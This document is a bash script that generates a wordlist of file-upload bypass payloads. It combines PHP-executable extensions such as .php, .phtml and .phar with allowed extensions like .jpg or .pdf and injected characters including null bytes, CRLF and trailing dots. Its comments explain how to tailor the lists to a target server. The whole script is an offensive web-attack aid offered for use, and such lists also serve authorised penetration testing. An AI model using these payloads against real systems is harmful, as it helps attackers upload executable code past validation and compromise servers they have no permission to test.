#!/bin/bash
# This BASH script will perform character injection to auto generate a wordlist and bypass server-side >
# This script is by-default for PHP based apps. Please change the extensions list in Line #4 according >
# This script is by-default for apps that allow JPG, PNG, XLS, PDF, GIF files. Please change the allowe>

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.php7' '.phar'; do # change here the list of extensions according to technology used by the target
      for ext1 in '.jpg' '.png' '.xls' '.pdf' '.gif'; do # change here the list of allowed extensions by the target
        echo "$ext$char$char" >> wordlist.txt
        echo "$char$char$ext" >> wordlist.txt
        echo "$char$ext$ext1" >> wordlist.txt
        echo "$ext$char" >> wordlist.txt
        echo "$ext1$ext$char" >> wordlist.txt
        echo "$ext$ext1$char" >> wordlist.txt
      done
    done
done
cat wordlist.txt | sort -u > wordlist-for-file-upload.txt
rm wordlist.txt
echo "Wordlist saved as wordlist-for-file-upload.txt"
